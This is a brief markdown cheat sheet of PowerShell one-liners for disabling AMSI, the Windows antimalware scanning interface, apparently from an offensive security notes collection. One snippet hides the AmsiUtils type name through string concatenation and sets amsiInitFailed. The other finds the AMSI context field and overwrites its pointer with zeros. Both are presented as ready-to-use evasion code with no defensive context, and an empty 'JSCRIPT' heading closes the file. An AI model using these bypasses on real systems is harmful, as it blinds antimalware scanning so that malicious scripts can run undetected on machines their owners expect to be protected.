# Powershell 
<br>

### Disables AMSI.  Have to trick the AMSI bypass with string concatination 
<br>

``` powershell
$fields = [Ref].Assembly.GetType('System.Management'+'.Automation.Amsi'+'Utils').GetField('amsiInitFailed','NonPublic,Static')
$fields.SetValue($null,$true)

```
<br>

### Disable AMSI with AmsiContext rewrite to 0000  
<br>

``` powershell
$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)

```





# JSCRIPT
